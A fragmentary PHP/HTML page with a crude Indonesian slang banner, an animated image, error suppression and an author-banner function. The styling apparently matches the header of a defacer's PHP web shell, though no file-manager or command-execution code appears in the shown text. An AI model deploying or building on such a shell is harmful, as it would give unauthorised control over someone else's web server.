...
<center>
<font face="Bungee" size="5">KUNTUL | JINGKONTOT </font></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center><img src="https://i.pinimg.com/originals/24/00/35/240035190dc361aa730cdeeadff51422.gif" width="280" height="280" title="KUNTUL" alt="JINGKONTOT" class="center" />
<br><br><br>
<?php
set_time_limit(0);
error_reporting(0);
...
function author() {
	echo "<center><br>KUNTUL | JINGKONTOT | </center>";
	exit();
}
